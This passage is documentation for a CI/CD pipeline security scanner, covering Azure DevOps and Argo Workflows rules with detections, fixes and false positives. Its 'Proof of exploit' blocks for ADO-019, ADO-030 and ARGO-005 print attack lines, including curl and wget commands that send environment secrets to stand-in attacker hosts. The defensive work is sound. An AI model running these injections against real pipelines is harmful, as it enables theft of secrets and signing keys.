**How this is detected.** Long-lived `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` values in pipeline variables or task inputs can't be rotated on a fine-grained schedule. Prefer OIDC or vault-based credential injection for cross-cloud access.

**Recommendation.** Use workload identity federation or an Azure Key Vault task to inject short-lived AWS credentials at runtime. Remove static AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY from pipeline variables and task parameters.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Variable values that *reference* a secret rather than embed one (``$(MySecretVar)`` / ``$(AwsKey)`` mapped from a variable group backed by Key Vault) still match the ``AWS_ACCESS_KEY_ID`` / ``AWS_SECRET_ACCESS_KEY`` name regex because the variable name itself looks long-lived. The rule has no way to follow the binding to its source. Suppress per-pipeline via ``--ignore-file`` once you've confirmed the value is injected at runtime from a Key Vault group rather than stored in the YAML.

**Source:** [`ADO-014`](../providers/azure.md#ado-014) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-015`: Job has no `timeoutInMinutes`, unbounded build <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-015 }

**Evidences:** [`ESF-D-BUILD-TIMEOUT`](#ctrl-esf-d-build-timeout) Enforce bounded build execution (single-use, time-limited).

**How this is detected.** Without `timeoutInMinutes`, the job runs until Azure's 60-minute default kills it. Explicit timeouts cap blast radius and the window during which a compromised step has access to service connections.

**Recommendation.** Add `timeoutInMinutes:` to each job, sized to the 95th percentile of historical runtime plus margin. Azure's default is 60 minutes, an explicitly shorter value limits blast radius and agent cost.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-015`](../providers/azure.md#ado-015) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-016 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a pipeline. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the build agent.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`ADO-016`](../providers/azure.md#ado-016) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-017 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a pipeline give the container full access to the build agent, enabling container escape and lateral movement.

**Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-017`](../providers/azure.md#ado-017) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-018 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a pipeline. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-018`](../providers/azure.md#ado-018) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-019`: `extends:` template on PR-validated pipeline points to local path <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-019 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** `extends: template: <local-file>` includes another YAML from the CURRENT repo. On PR validation builds, the repo content is the PR branch, letting the PR author swap the template body and inject arbitrary pipeline logic. Cross-repo templates (`template: foo.yml@my-repo`) are version-pinned and not affected.

**Recommendation.** Pin the extends template to a protected repository ref (`template@ref`). Local templates in PR-validated pipelines can be poisoned by the PR author.

**Proof of exploit.**

```
# Vulnerable: PR-validated pipeline extends a LOCAL template.
trigger: none
pr:
  branches: { include: [main] }
extends:
  template: templates/standard-build.yml   # no @repo ref

# Attack: a PR author edits ``templates/standard-build.yml``
# in their branch to inject any pipeline body they want.
# The PR-validation run materializes the PR branch first,
# THEN evaluates ``extends:`` against that tree, so the
# attacker's template body runs with the pipeline's service
# connections in scope.
#
# In the PR's templates/standard-build.yml:
#   jobs:
#     - job: exfil
#       steps:
#         - bash: |
#             curl https://attacker.example/x \
#               -d "$(printenv | base64 -w0)"
#
# No further trick needed, ``extends:`` is the gate and the
# PR author controls what's behind it.

# Safe: pin the template to a protected ref in a separate repo.
resources:
  repositories:
    - repository: pipeline-templates
      type: git
      name: ProjectName/pipeline-templates
      ref: refs/tags/v1.4.2     # immutable, signed tag
extends:
  template: templates/standard-build.yml@pipeline-templates
```

**Source:** [`ADO-019`](../providers/azure.md#ado-019) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-020 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`ADO-020`](../providers/azure.md#ado-020) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-021 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-021`](../providers/azure.md#ado-021) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-022 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR pipeline (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`ADO-022`](../providers/azure.md#ado-022) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-023 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-023`](../providers/azure.md#ado-023) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-024 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release, [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** On Azure Pipelines the common pattern is a ``Bash@3`` task invoking ``cosign attest --yes --predicate=provenance.json $(image)``. The native Microsoft SBOM tool emits ``_manifest/spdx_2.2/manifest.spdx.json`` for SBOM but does not produce provenance on its own.

**Recommendation.** Add a task that runs ``cosign attest`` against a ``provenance.intoto.jsonl`` statement, or Microsoft's ``sbom-tool`` in attestation mode. ADO-006 covers signing; this rule covers the in-toto statement SLSA Build L3 additionally requires.

**Source:** [`ADO-024`](../providers/azure.md#ado-024) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-025`: Cross-repo template not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-025 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Azure Pipelines resolves ``template: build.yml@tools`` against the ``tools`` repo resource's ``ref:`` field. When that ref is ``refs/heads/main`` (or missing, which defaults to the pipeline's default branch), a push to the callee repo changes what your pipeline runs on the next invocation.

**Recommendation.** On every ``resources.repositories`` entry referenced from a ``template: ...@repo-alias`` directive, set ``ref: refs/tags/<sha>`` or the bare 40-char commit SHA, never a branch or floating tag. A moved branch/tag swaps the template body without changing your pipeline file.

**Source:** [`ADO-025`](../providers/azure.md#ado-025) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-026`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-026 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** ADO pipelines can run arbitrary shell via ``bash`` / ``script`` / ``powershell`` tasks. This rule scans every string value for known-bad patterns (reverse shells, base64-decoded execution, miner binaries, exfil channels). Orthogonal to ADO-016/ADO-017/ADO-023.

**Recommendation.** Treat as a potential compromise. Identify the PR/branch that added the matching task(s), rotate any Service Connections the pipeline can reach, and audit Pipeline run logs for outbound traffic to the matched hosts.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`ADO-026`](../providers/azure.md#ado-026) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-027`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-027 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Complements ADO-002 (script injection from untrusted PR context). Fires on intrinsically risky shell idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate any value that must feed a dynamic command at the boundary.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`ADO-027`](../providers/azure.md#ado-027) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-028`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-028 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Complements ADO-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry (Azure Artifacts) instead of installing from a filesystem path or tarball URL.

**Source:** [`ADO-028`](../providers/azure.md#ado-028) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-029`: Service-connection-using job without environment or branch gate <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-029 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** Pairs with IAM-008 (the AWS-side OIDC rule). Azure's equivalent trust path runs through service connections that map to Azure AD federated identity credentials. The ADO-side gate is either a deployment + environment or a branch-pinned condition; this rule flags jobs that have neither.

**Recommendation.** Every job that consumes an Azure service connection (via ``AzureCLI@``, ``AzurePowerShell@``, ``AzureKeyVault@``, ``AzureWebApp@``, etc.) must either be a ``deployment:`` job bound to an ``environment:`` (which carries approval checks and audit) or carry a ``condition:`` that pins ``Build.SourceBranch`` to a protected ref. Without one of those gates, any branch push drives the federated assume-role on Azure AD.

**Source:** [`ADO-029`](../providers/azure.md#ado-029) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-030`: pool interpolates attacker-controllable value <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-030 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** ADO-013 catches self-hosted pools that aren't ephemeral; this rule catches the upstream targeting choice. When ``pool:`` (or its ``name`` / ``demands`` sub-fields) is computed from an attacker-controllable expression, whoever triggers the pipeline picks where the job runs, including any agent pool the project exposes (``deploy-prod``, ``signer``, ``hsm`` …). Two attacker surfaces are flagged: runtime SCM macros (``$(Build.SourceBranchName)``, ``$(System.PullRequest.SourceBranch)``, …) and caller-controlled template parameters (``${{ parameters.X }}``, the value comes from whoever queued the run). The rule walks all three pool shapes, string scalar, dict ``{ name, vmImage, demands }``, and the ``demands`` list form.

**Recommendation.** Hard-code ``pool:`` to a specific agent pool name (or ``vmImage:`` for Microsoft-hosted). If pool selection has to be parameterised, validate the candidate against an explicit allowlist before the job runs (e.g. a ``condition:`` guard against a vetted set), and never inline ``$(Build.*)`` / ``$(System.PullRequest.*)`` / ``${{ parameters.X }}`` values as the pool name or as a demand.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Pipelines that intentionally select agent pools via a vetted ``variables:`` block (``POOL_NAME: prod-pool``) are out of scope, pipeline variables defined in the same file are author-controlled. Static custom names are not flagged. The rule only matches the curated runtime-macro catalog and the literal ``${{ parameters.X }}`` template-parameter shape.

**Proof of exploit.**

```
# Vulnerable: pool name computed from caller-controlled parameter.
parameters:
  - name: targetPool
    type: string
    default: linux-pool
jobs:
  - job: build
    pool: { name: ${{ parameters.targetPool }} }
    steps:
      - bash: ./scripts/build.sh

# Attack: the pipeline is queued via the REST API or a
# downstream caller. Whoever supplies ``targetPool`` chooses
# the agent fleet:
#
#   POST .../_apis/pipelines/42/runs
#   { "templateParameters": { "targetPool": "signer-hsm" } }
#
# The attacker routes the job onto ``signer-hsm``, a privileged
# self-hosted pool intended only for release signing. The
# build script now executes on a host that has the signing key
# mounted; ``./scripts/build.sh`` (or anything else the caller
# also influences) can read the key and exfil it.

# Safe: hard-code the pool, validate parameter against an
# allowlist when parameterization is required.
parameters:
  - name: targetPool
    type: string
    default: linux-pool
    values: [linux-pool, windows-pool]   # vetted allowlist
jobs:
  - job: build
    pool: { name: ${{ parameters.targetPool }} }
```

**Source:** [`ADO-030`](../providers/azure.md#ado-030) in the [Azure DevOps provider](../providers/azure.md).

### `ARGO-001`: Argo template container image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-argo-001 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests, [`ESF-S-IMMUTABLE`](#ctrl-esf-s-immutable) Enforce artifact / tag immutability to preserve provenance.

**How this is detected.** Walks ``spec.templates[].container``, ``spec.templates[].script``, and ``spec.templates[].containerSet.containers[]``. The image must contain ``@sha256:`` followed by a 64-char hex digest.

**Recommendation.** Pin every container / script template image to a content-addressable digest (``alpine@sha256:<digest>``). Tag-only references (``alpine:3.18``) and rolling tags (``alpine:latest``) let a compromised registry update redirect the workflow's containers at the next pull, with no audit trail in the WorkflowTemplate.

**Source:** [`ARGO-001`](../providers/argo.md#argo-001) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-002`: Argo template container runs privileged or as root <span class="pg-sev pg-sev--high">HIGH</span> { #detail-argo-002 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Detection fires on ``securityContext.privileged: true``, ``runAsUser: 0``, ``runAsNonRoot: false``, ``allowPrivilegeEscalation: true``, or no ``securityContext`` block at all. Also walks ``spec.podSpecPatch`` (raw YAML) for an explicit ``privileged: true`` token.

**Recommendation.** Set ``securityContext.privileged: false``, ``runAsNonRoot: true``, and ``allowPrivilegeEscalation: false`` on every template container / script. A privileged container shares the node's kernel namespaces; a malicious image then has root on the build node and breaks the boundary between workflow and cluster.

**Source:** [`ARGO-002`](../providers/argo.md#argo-002) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-003`: Argo workflow uses the default ServiceAccount <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-003 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** Applies to ``Workflow`` and ``CronWorkflow``. ``WorkflowTemplate`` / ``ClusterWorkflowTemplate`` are exempt because the SA is set on the run that references them. An explicit ``serviceAccountName: default`` is treated the same as omission.

**Recommendation.** Set ``spec.serviceAccountName`` (or ``spec.workflowSpec.serviceAccountName`` for CronWorkflow) to a least-privilege ServiceAccount that carries only the secrets and RBAC the workflow needs. Falling back to the namespace's ``default`` SA grants access to whatever cluster-admin or wildcard role someone later binds to ``default``, a privilege-escalation surface that should never be load-bearing for workflow pods.

**Source:** [`ARGO-003`](../providers/argo.md#argo-003) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-004`: Argo workflow mounts hostPath or shares host namespaces <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-argo-004 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers), [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Walks ``spec.volumes[].hostPath`` and the raw ``spec.podSpecPatch`` string for ``hostNetwork``, ``hostPID``, ``hostIPC``, and ``hostPath``.

**Recommendation.** Use ``emptyDir`` or PVC-backed volumes instead of ``hostPath``. Drop ``hostNetwork: true`` / ``hostPID: true`` / ``hostIPC: true`` from any inline ``podSpecPatch``. A hostPath mount of ``/var/run/docker.sock`` or ``/`` lets the workflow break out of the pod and act as the underlying node.

**Source:** [`ARGO-004`](../providers/argo.md#argo-004) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-005`: Argo input parameter interpolated unsafely in script / args <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-argo-005 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Fires on any ``{{inputs.parameters.X}}``, ``{{workflow.parameters.X}}``, or ``{{item.X}}`` token inside a ``script.source`` body or a ``container.args`` string that isn't already wrapped in quotes. Doesn't fire on the env-var indirection pattern, which is safe.

**Recommendation.** Don't interpolate ``{{inputs.parameters.<name>}}`` directly into ``script.source`` or ``container.args``. Argo substitutes the value before the shell parses it, so a parameter containing ``; rm -rf /`` runs as shell. Pass the parameter via ``env:`` (``value: '{{inputs.parameters.<name>}}'``) and reference the env var quoted in the script (``"$NAME"``); or use ``inputs.artifacts`` for file payloads.

**Known false positives.**

- Parameters whose values are always controlled by trusted templates (a fixed enum, an internal SHA, an upstream service identifier the workflow generates itself) are safe to interpolate unquoted but the rule has no way to see the producer. Suppress per-template with ``--ignore-file`` once you've verified the parameter source can't reach a user. Quoted forms (``"{{inputs.parameters.X}}"``) are already excluded by the negative-lookbehind, so the typical safe pattern doesn't false-positive.

**Proof of exploit.**

```
# Vulnerable: webhook-triggered workflow interpolates a
# user-supplied parameter directly into a shell script.
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata: { generateName: greet- }
spec:
  entrypoint: main
  arguments:
    parameters:
      - name: who
  templates:
    - name: main
      inputs: { parameters: [ { name: who } ] }
      script:
        image: alpine:3.20
        command: [sh]
        source: |
          echo Hello {{inputs.parameters.who}}

# Attack: a webhook caller (or anyone with Submit on the
# WorkflowTemplate) supplies a parameter carrying shell:
#
#   argo submit greet.yml -p who='x;wget -qO- attacker/exfil \
#     -d "$(env|base64)";:'
#
# Argo substitutes the parameter BEFORE handing the source
# to ``sh``, so the `;` ends the echo and the next command
# runs. The pod inherits the workflow's ServiceAccount; if
# that SA has any cluster privilege (mount, image-pull, kubectl)
# the attacker now has it.

# Safe: route through env so the shell only sees a quoted
# expansion of a controlled-name variable.
      script:
        image: alpine:3.20
        command: [sh]
        env:
          - name: WHO
            value: '{{inputs.parameters.who}}'
        source: |
          echo "Hello $WHO"
```

**Source:** [`ARGO-005`](../providers/argo.md#argo-005) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-006`: Literal secret value in Argo template env or parameter default <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-argo-006 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Strong matches: AWS access keys, GitHub PATs, JWTs. Weak match: env var name suggests a secret (``*_TOKEN``, ``*_KEY``, ``*PASSWORD``, ``*SECRET``) and the value is a non-empty literal rather than an interpolation.

**Recommendation.** Mount secrets via ``env.valueFrom.secretKeyRef`` (or a ``volumes:`` Secret mount) instead of writing the value into ``env.value`` or ``arguments.parameters[].value``. Workflow manifests are committed to git and cluster-readable; literal values leak through normal access paths.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ARGO-006`](../providers/argo.md#argo-006) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-007`: Argo workflow has no activeDeadlineSeconds <span class="pg-sev pg-sev--low">LOW</span> { #detail-argo-007 }

**Evidences:** [`ESF-D-BUILD-TIMEOUT`](#ctrl-esf-d-build-timeout) Enforce bounded build execution (single-use, time-limited).

**How this is detected.** Applies to ``Workflow``, ``CronWorkflow``, ``WorkflowTemplate``, and ``ClusterWorkflowTemplate``. The field can sit at the workflow level or on individual templates.

**Recommendation.** Set ``spec.activeDeadlineSeconds`` (or ``spec.workflowSpec.activeDeadlineSeconds`` on a ``CronWorkflow``) so a hung step can't pin the workflow controller's reconcile cycle indefinitely. Pick a value generous enough for the slowest legitimate run (e.g. 3600 for a typical pipeline, 21600 for ML training). Per-template ``activeDeadlineSeconds`` is also accepted as evidence of intent.

**Source:** [`ARGO-007`](../providers/argo.md#argo-007) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-008`: Argo script source pipes remote install or disables TLS <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-argo-008 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Walks ``script.source`` and joined ``container.args`` text with the cross-provider ``_primitives.remote_script_exec`` and ``_primitives.tls_bypass`` detectors. Coverage stays aligned with GHA-016 / GHA-027 / BK-004 / BK-008 / TKN-008 / GCB-010 / GCB-011 / DF-004.

**Recommendation.** Replace ``curl ... | sh`` with a download-then-verify-then-execute pattern. Drop TLS-bypass flags (``curl -k``, ``git config http.sslverify false``); install the missing CA into the template image instead. Both forms let an attacker controlling DNS / a transparent proxy substitute the script the workflow runs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ARGO-008`](../providers/argo.md#argo-008) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-009`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-009 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** Detection mirrors GHA-006 / TKN-009 / BK-009, the shared signing-token catalog (cosign, sigstore, slsa-github-generator, slsa-framework, notation-sign) is searched across every string in each Argo document. Fires only on artifact-producing Workflows / WorkflowTemplates (those that invoke ``docker build`` / ``docker push`` / kaniko / ``helm upgrade`` / ``aws s3 sync`` / etc.) so lint-only Workflows don't trip it.

**Recommendation.** Add a cosign step to the Workflow. The most common shape is a final ``sign`` template that runs ``cosign sign --yes <repo>@sha256:<digest>`` after the build. Sign by digest, not tag, so a re-pushed tag can't bypass the signature.

**Source:** [`ARGO-009`](../providers/argo.md#argo-009) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-010`: No SBOM generated for build artifacts <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-010 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** An SBOM (CycloneDX or SPDX) records every component baked into the build. Without one, post-incident triage can't answer ``did this CVE ship?`` for a given artifact. Detection uses the shared SBOM-token catalog: syft, cyclonedx, cdxgen, spdx-tools, microsoft/sbom-tool. Fires only on artifact-producing Workflows.

**Recommendation.** Add an SBOM-generation template. ``syft <artifact> -o cyclonedx-json > /tmp/sbom.json`` runs in any standard container; ``cyclonedx-cli`` and ``cdxgen`` are alternative producers. Persist the SBOM as an output artifact so downstream templates and consumers can read it.

**Source:** [`ARGO-010`](../providers/argo.md#argo-010) in the [Argo Workflows provider](../providers/argo.md).

### `ARGO-011`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-011 }

